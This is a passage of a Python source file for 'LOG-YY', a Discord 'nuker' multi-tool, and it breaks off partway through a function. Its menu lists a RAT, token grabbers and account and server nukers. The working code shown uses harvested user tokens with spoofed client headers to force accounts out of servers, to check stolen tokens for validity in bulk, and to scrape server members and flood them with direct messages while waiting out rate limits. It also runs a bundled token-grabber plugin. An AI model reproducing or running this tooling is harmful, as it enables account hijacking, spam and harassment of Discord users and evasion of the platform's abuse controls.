# Developper : waltta#6821 | https://github.com/waltta/LOG-YY-Nuker-Discord
# LOG-YY Discord Nuker / Multi Tool©
# Copyright © 2022 waltta#6821 
# Copyright © LOG-YY-Nuke
######################################################### 

from utilities.Settings.common import *
from utilities.Settings.update import search_for_updates
import utilities.Plugins.Auto_Login
import utilities.Plugins.DM_Deleter
import utilities.Plugins.Token_Info
import utilities.Plugins.QR_Grabber
import utilities.Plugins.Account_Nuker
  
if __name__ == "__main__":
    import sys
    if os.path.basename(sys.argv[0]).endswith("exe"):
        with open(getTempDir()+"\\cmdlok_proxies", 'w'): pass
        clear()
        proxy_scrape()
        sleep(1)
    try:
        assert sys.version_info >= (3,8)
    except AssertionError:
        print(f"{Fore.RED}Your Python Version ({sys.version_info[0]}.{sys.version_info[1]}.{sys.version_info[2]}) is not supported for LOG-YY Nuker, Please Download v3.9+ to use CMDLok-Nuker!")
        sleep(5)
        print("Exiting...")
        sleep(1.5)
        os._exit(0)
    else:
        with open(getTempDir()+"\\cmdlok_proxies", 'w'): pass
        clear()
        proxy_scrape()
        sleep(1.5)
    finally:
        Fore.RESET

#########################################################

def Spinner():
	l = ['|', '/', '-', '\\', ' ']
	for i in l+l+l:
		sys.stdout.write(f"""\r {i}""")
		sys.stdout.flush()
		time.sleep(0.1)

global cls
def cls():
 os.system('cls' if os.name=='nt' else 'clear')
def tool():
  os.system('cls' if os.name=='nt' else 'clear')

def clearConsole(): return os.system(
    'cls' if os.name in ('nt', 'dos') else 'clear')

global useragent
def useragent():
    file = open('utilities/QR/useragent.txt','r')
    useragent = (random.choice(list(file)))
    useragent2 = []
    useragent2.append(useragent)
    useragent1 = []

#########################################################

import os
import time
import emoji
import shutil
import zipfile
import datetime
import colorama
import requests
import easygui, os
import random, string
from time import sleep
from json import loads
from time import sleep
from json import dumps
import base64, pyperclip
from typing import Union
import webbrowser, base64
from colorama import Fore
import requests, threading
from tasksio import TaskPool
from tqdm import tqdm, trange
from websocket import WebSocket
from colorama import Back, Fore, Style
from concurrent.futures import ThreadPoolExecutor
from discord import Webhook, RequestsWebhookAdapter
 
import os
from os import system

try:
    import requests
except:
    os.system("pip install requests")
    import requests
try:
    from requests import get
except:
    os.system("pip install requests")
    from requests import get

import threading

try:
    import colorama
except:
    os.system("pip install colorama")
    import colorama

try:
    import discord
except:
    os.system("pip install discord")
    import discord

from discord.ext import commands

try:
    import pyautogui
except:
    os.system("pip install pyautogui")
    import pyautogui

import time
import re

try:
    import http.client
except:
    os.system('pip install python-http-client')
    import http.client

import random

try:
    import json
except:
    os.system('pip install json')
    import json


try:
    import base64
except:
    os.system('pip install base64')
    import base64

import string
import sys
from colorama import Fore

try:
    import emoji as ej
except:
    os.system('pip install emoji')
    import emoji as ej

try:
    import websocket
except:
    os.system('pip install websocket')
    import websocket

try:
    import asyncio
except:
    os.system('pip install asyncio')
    import asyncio

try:
    from bs4 import BeautifulSoup
except:
    os.system('pip install beautifulsoup4')

try:
    from webdriver_manager.chrome import ChromeDriverManager
except:
    os.system('pip install webdriver-manager')
    from webdriver_manager.chrome import ChromeDriverManager

try:
    from PIL import Image
except:
    os.system('pip install pillow')
    from PIL import Image

try:
    import discum
except:
    os.system('pip install discum')
    import discum

try:
    from selenium import webdriver
except:
    os.system('pip install selenium')
    from selenium import webdriver

lock = threading.Lock()
os.system('mode 120,30')
threads = 3

ur = 'https://discord.com/api/v9/channels/messages'
tokens = open('tokens.txt', 'r').read().splitlines()

def randstr(lenn):
    alpha = "abcdefghijklmnopqrstuvwxyz0123456789"
    text = ''
    for i in range(0, lenn):
        text += alpha[random.randint(0, len(alpha) - 1)]

    return text

def mainHeader(token):
    return {
        "authorization": token,
        "accept": "*/*",
        'accept-encoding': 'gzip, deflate, br',
        "accept-language": "en-GB",
        "content-length": "90",
        "content-type": "application/json",
        "cookie": f"__cfuid={randstr(43)}; __dcfduid={randstr(32)}; locale=en-US",
        "origin": "https://discord.com",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9003 Chrome/91.0.4472.164 Electron/13.4.0 Safari/537.36",
        "x-debug-options": "bugReporterEnabled",
        "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDAzIiwib3NfdmVyc2lvbiI6IjEwLjAuMjI0NjMiLCJvc19hcmNoIjoieDY0Iiwic3lzdGVtX2xvY2FsZSI6InNrIiwiY2xpZW50X2J1aWxkX251bWJlciI6OTkwMTYsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9"
    }

def secondHeader(token):
    return {
        ':authority': 'discord.com',
        ':method': 'PATCH',
        ':path': '/api/v9/users/@me',
        ':scheme': 'https',
        'accept': '*/*',
        'accept-encoding': 'gzip, deflate, br',
        'accept-language': 'en-US',
        'authorization': token,
        'content-length': '124',
        'content-type': 'application/json',
        'Cookie': f"__cfuid={randstr(43)}; __dcfduid={randstr(32)}; locale=en-US",
        'origin': 'https://canary.discord.com',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.616 Chrome/91.0.4472.164 Electron/13.4.0 Safari/537.36',
        'x-debug-options': 'bugReporterEnabled',
        'x-super-properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJjYW5hcnkiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC42MTYiLCJvc192ZXJzaW9uIjoiMTAuMC4yMjQ1OCIsIm9zX2FyY2giOiJ4NjQiLCJzeXN0ZW1fbG9jYWxlIjoic2siLCJjbGllbnRfYnVpbGRfbnVtYmVyIjo5ODgyMywiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0='}

def spammer():
    global threads
    asc = asyncio.get_event_loop()
    tokens = open('tokens.txt', 'r').read().splitlines()
    counttokens = len(open('tokens.txt').readlines())
    clear = lambda: os.system('cls')
    clear()

    colorama.init()
    print('')
    print('')
    Write.Print("                                     ██╗      ██████╗  ██████╗      ██╗   ██╗██╗   ██╗ \n", Colors.white_to_green, interval=0.000)
    Write.Print("                                     ██║     ██╔═══██╗██╔════╝      ╚██╗ ██╔╝╚██╗ ██╔╝  \n", Colors.white_to_green, interval=0.000)
    Write.Print("                                     ██║     ██║   ██║██║  ███╗█████╗╚████╔╝  ╚████╔╝    \n", Colors.white_to_green, interval=0.000)
    Write.Print("                                     ██║     ██║   ██║██║   ██║╚════╝ ╚██╔╝    ╚██╔╝      \n", Colors.white_to_green, interval=0.000)
    Write.Print(f" >> created by waltta#6821           ███████╗╚██████╔╝╚██████╔╝        ██║      ██║      \n", Colors.white_to_green, interval=0.000)
    Write.Print(" >> discord.gg/FWVnT9tyvE            ╚══════╝ ╚═════╝  ╚═════╝         ╚═╝      ╚═╝       \n", Colors.white_to_green, interval=0.000)
    Write.Print("────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────", Colors.white_to_green, interval=0.000)
    print(f'''{Fore.GREEN}'''.replace('>>', f'{Fore.GREEN}>>{Fore.WHITE}') + f'''
{Fore.WHITE}[{Fore.GREEN}1{Fore.RESET}{Fore.WHITE}]{Fore.RESET} Server Joiner   {Fore.BLACK}|{Fore.RESET}{Fore.WHITE}[{Fore.GREEN}9{Fore.RESET}{Fore.WHITE}]{Fore.RESET}  Channel Spammer   {Fore.BLACK}|{Fore.RESET}{Fore.WHITE}[{Fore.GREEN}17{Fore.RESET}{Fore.WHITE}]{Fore.RESET} PC Rat{Fore.RESET}              {Fore.BLACK}|{Fore.RESET}{Fore.WHITE}[{Fore.GREEN}25{Fore.RESET}{Fore.WHITE}]{Fore.RESET} Token Generator{Fore.RESET}
{Fore.WHITE}[{Fore.GREEN}2{Fore.RESET}{Fore.WHITE}]{Fore.RESET} Server Leaver   {Fore.BLACK}|{Fore.RESET}{Fore.WHITE}[{Fore.GREEN}10{Fore.RESET}{Fore.WHITE}]{Fore.RESET} DM Spammer        {Fore.BLACK}|{Fore.RESET}{Fore.WHITE}[{Fore.GREEN}18{Fore.RESET}{Fore.WHITE}]{Fore.RESET} About/Activity{Fore.RESET}      {Fore.BLACK}|{Fore.RESET}{Fore.WHITE}[{Fore.GREEN}26{Fore.RESET}{Fore.WHITE}]{Fore.RESET} Nitro Generator{Fore.RESET}
{Fore.WHITE}[{Fore.GREEN}3{Fore.RESET}{Fore.WHITE}]{Fore.RESET} Token Checker   {Fore.BLACK}|{Fore.RESET}{Fore.WHITE}[{Fore.GREEN}11{Fore.RESET}{Fore.WHITE}]{Fore.RESET} Friend Spammer    {Fore.BLACK}|{Fore.RESET}{Fore.WHITE}[{Fore.GREEN}19{Fore.RESET}{Fore.WHITE}]{Fore.RESET} Server Lookup{Fore.RESET}       {Fore.BLACK}|{Fore.RESET}{Fore.WHITE}[{Fore.GREEN}27{Fore.RESET}{Fore.WHITE}]{Fore.RESET} QR Token Grabber{Fore.RESET}
{Fore.WHITE}[{Fore.GREEN}4{Fore.RESET}{Fore.WHITE}]{Fore.RESET} Token Onliner   {Fore.BLACK}|{Fore.RESET}{Fore.WHITE}[{Fore.GREEN}12{Fore.RESET}{Fore.WHITE}]{Fore.RESET} HypeSquad Joiner  {Fore.BLACK}|{Fore.RESET}{Fore.WHITE}[{Fore.GREEN}20{Fore.RESET}{Fore.WHITE}]{Fore.RESET} Token Infomation{Fore.RESET}    {Fore.BLACK}|{Fore.RESET}{Fore.WHITE}[{Fore.GREEN}28{Fore.RESET}{Fore.WHITE}]{Fore.RESET} Member ID Scraper{Fore.RESET}
{Fore.WHITE}[{Fore.GREEN}5{Fore.RESET}{Fore.WHITE}]{Fore.RESET} Token Grabber   {Fore.BLACK}|{Fore.RESET}{Fore.WHITE}[{Fore.GREEN}13{Fore.RESET}{Fore.WHITE}]{Fore.RESET} Reaction Spammer  {Fore.BLACK}|{Fore.RESET}{Fore.WHITE}[{Fore.GREEN}21{Fore.RESET}{Fore.WHITE}]{Fore.RESET} Status Changer{Fore.RESET}      {Fore.BLACK}|{Fore.RESET}{Fore.WHITE}[{Fore.GREEN}29{Fore.RESET}{Fore.WHITE}]{Fore.RESET} PFP Changer{Fore.RESET}
{Fore.WHITE}[{Fore.GREEN}6{Fore.RESET}{Fore.WHITE}]{Fore.RESET} Server MassDM   {Fore.BLACK}|{Fore.RESET}{Fore.WHITE}[{Fore.GREEN}14{Fore.RESET}{Fore.WHITE}]{Fore.RESET} NickName Changer  {Fore.BLACK}|{Fore.RESET}{Fore.WHITE}[{Fore.GREEN}22{Fore.RESET}{Fore.WHITE}]{Fore.RESET} Group Spammer{Fore.RESET}       {Fore.BLACK}|{Fore.RESET}{Fore.WHITE}[{Fore.GREEN}30{Fore.RESET}{Fore.WHITE}]{Fore.RESET} About{Fore.RESET}
{Fore.WHITE}[{Fore.GREEN}7{Fore.RESET}{Fore.WHITE}]{Fore.RESET} Account Nuker   {Fore.BLACK}|{Fore.RESET}{Fore.WHITE}[{Fore.GREEN}15{Fore.RESET}{Fore.WHITE}]{Fore.RESET} Webhook Spammer   {Fore.BLACK}|{Fore.RESET}{Fore.WHITE}[{Fore.GREEN}23{Fore.RESET}{Fore.WHITE}]{Fore.RESET} Auto Login{Fore.RESET}          {Fore.BLACK}|{Fore.RESET}{Fore.WHITE}[{Fore.GREEN}31{Fore.RESET}{Fore.WHITE}]{Fore.RESET}{Fore.GREEN} THREADS{Fore.RESET}
{Fore.WHITE}[{Fore.GREEN}8{Fore.RESET}{Fore.WHITE}]{Fore.RESET} Server Nuker    {Fore.BLACK}|{Fore.RESET}{Fore.WHITE}[{Fore.GREEN}16{Fore.RESET}{Fore.WHITE}]{Fore.RESET} VC Spammer        {Fore.BLACK}|{Fore.RESET}{Fore.WHITE}[{Fore.GREEN}24{Fore.RESET}{Fore.WHITE}]{Fore.RESET} DM Deleter{Fore.RESET}          {Fore.BLACK}|{Fore.RESET}{Fore.WHITE}[{Fore.GREEN}32{Fore.RESET}{Fore.WHITE}]{Fore.RESET}{Fore.GREEN} EXIT{Fore.RESET}''')
    Write.Print("────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────", Colors.white_to_green, interval=0.000)
    choice = input(f'\x1B[1m[{Fore.GREEN}>>{Fore.RESET}] Choice : \x1B[1m ')



#   JOINER
    if choice == '1':
        Spinner()
        gh = input(f"""
Joiner is in the Paid Version of LOG-YY!\nIf You Are Wanting to Purchase Make Sure to Checkout the Offical LOG-YY Nuker Website!
                                   
[\x1b[95m1\x1b[\x1B[37m] LOG-YY Nuker Website
[\x1b[95m2\x1b[95m\x1B[37m] Exit
  
[\x1b[95m>>\x1b[95m\x1B[37m] Choice : """)

        if gh in ['01','1']:
            webbrowser.open('https://eliottvelo.wixsite.com/log-yy-nuker')
        elif gh in ['02','2']:
            exit = spammer()
        else:
         print('')


#   LEAVER
    if choice == '2':
        Spinner()
        token = open("tokens.txt", "r").read().splitlines()

        ID = input(f'\n[\x1b[{Fore.GREEN}>>{Fore.WHITE}\x1b[95m\x1B[37m] Server ID : ')

        apilink = "https://discord.com/api/v9/users/@me/guilds/" + str(ID)

        with open('tokens.txt', 'r') as handle:
            tokens = handle.readlines()
            for i in tokens:
                token = i.rstrip()
                headers = {
                    'Authorization': token,
                    "content-length": "0",
                    "cookie": f"__cfuid={randstr(43)}; __dcfduid={randstr(32)}; locale=en-US",
                    "origin": "https://discord.com",
                    "sec-fetch-dest": "empty",
                    "sec-fetch-mode": "cors",
                    "sec-fetch-site": "same-origin",
                    "user-agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.600 Chrome/91.0.4472.106 Electron/13.1.4 Safari/537.36",
                    "x-context-properties": "eyJsb2NhdGlvbiI6Ikludml0ZSBCdXR0b24gRW1iZWQiLCJsb2NhdGlvbl9ndWlsZF9pZCI6Ijg3OTc4MjM4MDAxMTk0NjAyNCIsImxvY2F0aW9uX2NoYW5uZWxfaWQiOiI4ODExMDg4MDc5NjE0MTk3OTYiLCJsb2NhdGlvbl9jaGFubmVsX3R5cGUiOjAsImxvY2F0aW9uX21lc3NhZ2VfaWQiOiI4ODExOTkzOTI5MTExNTkzNTcifQ==",
                    "x-debug-options": "bugReporterEnabled",
                    "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJjYW5hcnkiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC42MDAiLCJvc192ZXJzaW9uIjoiMTAuMC4yMjAwMCIsIm9zX2FyY2giOiJ4NjQiLCJzeXN0ZW1fbG9jYWxlIjoic2siLCJjbGllbnRfYnVpbGRfbnVtYmVyIjo5NTM1MywiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0="

                }
                requests.delete(apilink, headers=headers)
            print(f'{Fore.WHITE}[{Fore.GREEN}>>{Fore.WHITE}]) Done')

        time.sleep(1)
        exit = input(f'\n[\x1b[{Fore.GREEN}>>{Fore.WHITE}\x1b[95m\x1B[37m] Press ENTER : ')
        exit = clear()
        exit = spammer()



#   TOKEN CHECKER
    if choice == '3':
            Spinner()  
            print(f'\n[\x1b[{Fore.GREEN}>>{Fore.WHITE}\x1b[95m\x1B[37m] Loading Tokens :\n')
            time.sleep(0.5)
            def success(text): lock.acquire(); print(f"[{Fore.GREEN}>{Fore.RESET}] {Fore.GREEN}Valid {Fore.RESET}{text}{Fore.RESET}"); lock.release()
            def invalid(text): lock.acquire(); print(f"[{Fore.RED}>{Fore.RESET}] {Fore.RED}Invalid {Fore.RED} {text}{Fore.RESET}"); lock.release()

            with open("tokens.txt", "r") as f: tokens = f.read().splitlines()
            def save_tokens():
                with open("tokens.txt", "w") as f: f.write("")
                for token in tokens:
                    with open("tokens.txt", "a") as f: f.write(token + "\n")
            def removeDuplicates(file):
                lines_seen = set()
                with open(file, "r+") as f:
                    d = f.readlines(); f.seek(0)
                    for i in d:
                        if i not in lines_seen: f.write(i); lines_seen.add(i)
                    f.truncate()
            def check_token(token:str):
                response = requests.get('https://discord.com/api/v9/users/@me/library', headers={"accept": "*/*","accept-encoding": "gzip, deflate, br","accept-language": "en-US,en;q=0.9","authorization": token,"cookie": "__dcfduid=88221810e37411ecb92c839028f4e498; __sdcfduid=88221811e37411ecb92c839028f4e498dc108345b16a69b7966e1b3d33d2182268b3ffd2ef5dfb497aef45ea330267cf; locale=en-US; OptanonConsent=isIABGlobal=false&datestamp=Fri+Jun+03+2022+15%3A36%3A59+GMT-0400+(Eastern+Daylight+Time)&version=6.33.0&hosts=&landingPath=https%3A%2F%2Fdiscord.com%2F&groups=C0001%3A1%2CC0002%3A1%2CC0003%3A1; __stripe_mid=3a915c95-4cf7-4d27-9d85-cfea03f7ce829a88e5; __stripe_sid=b699111a-a911-402d-a08a-c8801eb0f2e8baf912; __cf_bm=nEUsFi1av6PiX4cHH1PEcKFKot6_MslL4UbUxraeXb4-1654285264-0-AU8vy1OnS/uTMTGu2TbqIGYWUreX3IAEpMo++NJZgaaFRNAikwxeV/gxPixQ/DWlUyXaSpKSNP6XweSVG5Mzhn/QPdHU3EmR/pQ5K42/mYQaiRRl6osEVJWMMtli3L5iIA==","referer": "https://discord.com/channels/967617613960187974/981260247807168532","sec-fetch-dest": "empty","sec-fetch-mode": "cors","sec-fetch-site": "same-origin","sec-gpc": "1","user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.61 Safari/537.36","x-discord-locale": "en-US","x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEwMi4wLjUwMDUuNjEgU2FmYXJpLzUzNy4zNiIsImJyb3dzZXJfdmVyc2lvbiI6IjEwMi4wLjUwMDUuNjEiLCJvc192ZXJzaW9uIjoiMTAiLCJyZWZlcnJlciI6IiIsInJlZmVycmluZ19kb21haW4iOiIiLCJyZWZlcnJlcl9jdXJyZW50IjoiIiwicmVmZXJyaW5nX2RvbWFpbl9jdXJyZW50IjoiIiwicmVsZWFzZV9jaGFubmVsIjoic3RhYmxlIiwiY2xpZW50X2J1aWxkX251bWJlciI6MTMwNDEwLCJjbGllbnRfZXZlbnRfc291cmNlIjpudWxsfQ=="}, timeout=5)
                if response.status_code == 200: success(f"| {token}")
                else: tokens.remove(token); invalid(f"| {token}")
            def check_tokens():
                threads=[]
                for token in tokens:
                    try:threads.append(threading.Thread(target=check_token, args=(token,)))
                    except Exception as e: pass
                for thread in threads: thread.start()
                for thread in threads: thread.join()
        

    

            def start():
                removeDuplicates("tokens.txt")
                check_tokens()
                save_tokens()

            start()
            print(f'\n\n[\x1b[95m>>\x1b[95m\x1B[37m] All Tokens have been Checked! (tokens.txt has been updated with only vaild tokens!)')
            time.sleep(1)
            exit = input('[\x1b[95m>>\x1b[95m\x1B[37m] Press ENTER : ')
            exit = clear()
            exit = spammer()



#   TOKEN ONLINER
    if choice == '4':
        Spinner()
        gh = input(f"""
Token Onliner is in the Paid Version of LOG-YY Nuker!\nIf You Are Wanting to Purchase Make Sure to Checkout the Offical LOG-YY Nuker Website!
            
[\x1b[95m1\x1b[95m\x1B[37m] LOG-YY Nuker Website
[\x1b[95m2\x1b[95m\x1B[37m] Exit
  
[\x1b[95m>>\x1b[95m\x1B[37m] Choice : """)

        if gh in ['01','1']:
            webbrowser.open('https://github.com/waltta')
        elif gh in ['02','2']:
            exit = spammer()
        else:
         print('')



#   TOKEN GRABBER
    if choice == '5':
        Spinner()
        exec(open('utilities/Plugins/Token_Grabber.py').read())



#   SERVER MASSDM
    if choice == '6':
        Spinner()
        print(
            f'{Fore.WHITE}[{Fore.RESET}{Fore.LIGHTRED_EX}!{Fore.RESET}{Fore.WHITE}]{Fore.RESET} {Fore.LIGHTRED_EX}Warning{Fore.RESET} Make Sure You Account is fully Verified Before Using this Command!')
        time.sleep(2)
        print(f'\n[\x1b[95m1\x1b[95m\x1B[37m] Multiple Tokens')
        print(f'[\x1b[95m2\x1b[95m\x1B[37m] One Account Token')
        choic = input('\n[\x1b[95m>>\x1b[95m\x1B[37m] Choice?: ')

        server = input(f'[\x1b[95m>>\x1b[95m\x1B[37m] Server ID: ')
        channel = input(f'[\x1b[95m>>\x1b[95m\x1B[37m] Channel ID: ')

        if choic == '1':
            with open("tokens.txt") as f:
                firstline = f.readline().rstrip()
            bot = discum.Client(token=firstline)

            def close_after_fetching(resp, guild_id):
                if bot.gateway.finishedMemberFetching(guild_id):
                    lenmembersfetched = len(bot.gateway.session.guild(guild_id).members)
                    print(str(lenmembersfetched) + ' members fetched')
                    bot.gateway.removeCommand(
                        {'function': close_after_fetching, 'params': {'guild_id': guild_id}})
                    bot.gateway.close()

            def get_members(guild_id, channel_id):
                bot.gateway.fetchMembers(guild_id, channel_id, keep='all', wait=1)
                bot.gateway.command(
                    {'function': close_after_fetching, 'params': {'guild_id': guild_id}})
                bot.gateway.run()
                bot.gateway.resetSession()
                return bot.gateway.session.guild(guild_id).members

            members = get_members(server, channel)
            memberslist = []

            for memberID in members:
                memberslist.append(memberID)
                print(memberID)

            f = open('utilities/QR/massdm_IDs.txt', "w")
            for element in memberslist:
                f.write(f'{element}' + '\n')
            f.close()

            print(f'[{Fore.LIGHTMAGENTA_EX}>{Fore.RESET}] Scraping Members!')
            time.sleep(2)

            file = open("utilities/QR/massdm_IDs.txt", "r")
            Counter = 0

            Content = file.read()
            CoList = Content.split("\n")

            for i in CoList:
                if i:
                    Counter += 1

            file2 = open("tokens.txt", "r")
            Counter2 = 0

            Content2 = file2.read()
            CoList2 = Content2.split("\n")

            for i in CoList2:
                if i:
                    Counter2 += 1

            time.sleep(2)

            print(f'{Counter} Members Where Scraped!')

            amountt = int(input('[\x1b[95m>>\x1b[95m\x1B[37m] How Many Members Would You Like To DM?: '))
            realamountt = int(amountt / Counter2)

            tokens = open("tokens.txt", "r").read().splitlines()
            message = input('[\x1b[95m>>\x1b[95m\x1B[37m] Message?: ')

            def dmserver_spam():
                opened_dms = 0
                try:
                    for token in tokens:
                        for i in range(realamountt):
                            with open("utilities/QR/massdm_IDs.txt", "r") as file:
                                allText = file.read()
                                words = list(map(str, allText.split()))
                                idd = random.choice(words)

                            header = mainHeader(token)
                            header2 = {
                            'authority': 'discord.com',
                            'method': 'POST',
                            'path': '/api/v9/users/@me/channels',
                            'scheme': 'https',
                            "authorization": token,
                            "accept": "*/*",
                            "accept-language": "en-GB",
                            "content-length": "90",
                            "content-type": "application/json",
                            "cookie": f"__cfuid={randstr(43)}; __dcfduid={randstr(32)}; locale=en-US",
                            "origin": "https://discord.com",
                            'referer': 'https://discord.com/channels/@me',
                            'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="96", "Google Chrome";v="96"',
                            'sec-ch-ua-mobile': '?0',
                            'sec-ch-ua-platform': "Windows",
                            "sec-fetch-dest": "empty",
                            "sec-fetch-mode": "cors",
                            "sec-fetch-site": "same-origin",
                            "user-agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9003 Chrome/91.0.4472.164 Electron/13.4.0 Safari/537.36",
                            'x-context-properties': 'e30=',
                            "x-debug-options": "bugReporterEnabled",
                            "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDAzIiwib3NfdmVyc2lvbiI6IjEwLjAuMjI0NjMiLCJvc19hcmNoIjoieDY0Iiwic3lzdGVtX2xvY2FsZSI6InNrIiwiY2xpZW50X2J1aWxkX251bWJlciI6OTkwMTYsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9"
                        }

                            payload = {'recipient_id': idd}
                            r1 = requests.post(f'https://discord.com/api/v9/users/@me/channels', headers=header2,
                                               json=payload)

                            payload = {"content": message, "tts": False}
                            j = json.loads(r1.content)

                            r2 = requests.post(f"https://discord.com/api/v9/channels/{j['id']}/messages",
                                               headers=header, json=payload)

                            if r2.status_code == 429:
                                ratelimit = json.loads(r2.content)
                                print(f"[{Fore.LIGHTRED_EX}!{Fore.RESET}] Ratelimit for",
                                      str(float(ratelimit['retry_after'])) + " seconds")
                                time.sleep(float(ratelimit['retry_after']))

                            if r1.status_code == 429:
                                ratelimit = json.loads(r1.content)
                                print(f"[{Fore.LIGHTRED_EX}!{Fore.RESET}] Ratelimit for",
                                      str(float(ratelimit['retry_after'])) + " seconds")
                                time.sleep(float(ratelimit['retry_after']))

                            elif r2.status_code == 200:
                                print(f"[{Fore.LIGHTGREEN_EX}>{Fore.RESET}] DM Sent to: {idd}!")

                            opened_dms += 1

                except:
                    print(f'[{Fore.LIGHTRED_EX}>{Fore.RESET}] Token Got Locked')

            dmserver_spam()


        elif choic == '2':
            tokens = input('[\x1b[95m>>\x1b[95m\x1B[37m] Account Token?: ')
            messaage = input('[\x1b[95m>>\x1b[95m\x1B[37m] Message?: ')

            bot = discum.Client(token=tokens)

            def close_after_fetching(resp, guild_id):
                if bot.gateway.finishedMemberFetching(guild_id):
                    lenmembersfetched = len(bot.gateway.session.guild(guild_id).members)
                    print(str(lenmembersfetched) + ' members fetched')
                    bot.gateway.removeCommand(
                        {'function': close_after_fetching, 'params': {'guild_id': guild_id}})
                    bot.gateway.close()

            def get_members(guild_id, channel_id):
                bot.gateway.fetchMembers(guild_id, channel_id, keep='all', wait=1)
                bot.gateway.command(
                    {'function': close_after_fetching, 'params': {'guild_id': guild_id}})
                bot.gateway.run()
                bot.gateway.resetSession()
                return bot.gateway.session.guild(guild_id).members

            members = get_members(server, channel)
            memberslist = []

            for memberID in members:
                memberslist.append(memberID)
                print(memberID)

            f = open('utilities/QR/massdm_IDs.txt', "w")
            for element in memberslist:
                f.write(f'{element}' + '\n')
            f.close()

            file = open("utilities/QR/massdm_IDs.txt", "r")
            Counter = 0

            Content = file.read()
            CoList = Content.split("\n")

            for i in CoList:
                if i:
                    Counter += 1

            time.sleep(2)

            print(f'[\x1b[95m>>\x1b[95m\x1B[37m] There Are {Counter} Members!')
            amountt = int(input('[\x1b[95m>>\x1b[95m\x1B[37m] How Many Members Would You Like To DM?: '))

            def dmspamre():
                try:
                    for i in range(amountt):
                        with open("utilities/QR/massdm_IDs.txt", "r") as file:
                            allText = file.read()
                            words = list(map(str, allText.split()))
                            idd = random.choice(words)

                        header = mainHeader(tokens)

                        headers = {
                            'authority': 'discord.com',
                            'method': 'POST',
                            'path': '/api/v9/users/@me/channels',
                            'scheme': 'https',
                            "authorization": tokens,
                            "accept": "*/*",
                            "accept-language": "en-GB",
                            "content-length": "90",
                            "content-type": "application/json",
                            "cookie": f"__cfuid={randstr(43)}; __dcfduid={randstr(32)}; locale=en-US",
                            "origin": "https://discord.com",
                            'referer': 'https://discord.com/channels/@me',
                            'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="96", "Google Chrome";v="96"',
                            'sec-ch-ua-mobile': '?0',
                            'sec-ch-ua-platform': "Windows",
                            "sec-fetch-dest": "empty",
                            "sec-fetch-mode": "cors",
                            "sec-fetch-site": "same-origin",
                            "user-agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9003 Chrome/91.0.4472.164 Electron/13.4.0 Safari/537.36",
                            'x-context-properties': 'e30=',
                            "x-debug-options": "bugReporterEnabled",
                            "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDAzIiwib3NfdmVyc2lvbiI6IjEwLjAuMjI0NjMiLCJvc19hcmNoIjoieDY0Iiwic3lzdGVtX2xvY2FsZSI6InNrIiwiY2xpZW50X2J1aWxkX251bWJlciI6OTkwMTYsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9"
                        }

                        payload = {'recipient_id': idd}
                        r1 = requests.post(f'https://discord.com/api/v9/users/@me/channels', headers=headers,
                                           json=payload)

                        payload = {"content": messaage, "tts": False}
                        j = json.loads(r1.content)

                        r2 = requests.post(f"https://discord.com/api/v9/channels/{j['id']}/messages",
                                           headers=header, json=payload)

                        if r2.status_code == 429:
                            ratelimit = json.loads(r2.content)
                            print(f"[{Fore.LIGHTRED_EX}!{Fore.RESET}] Ratelimit for",
                                  str(float(ratelimit['retry_after'])) + " seconds")
                            time.sleep(float(ratelimit['retry_after']))

                        if r1.status_code == 429:
                            ratelimit = json.loads(r1.content)
                            print(f"[{Fore.LIGHTRED_EX}!{Fore.RESET}] Ratelimit for",
                                  str(float(ratelimit['retry_after'])) + " seconds")
                            time.sleep(float(ratelimit['retry_after']))

                        elif r2.status_code == 200:
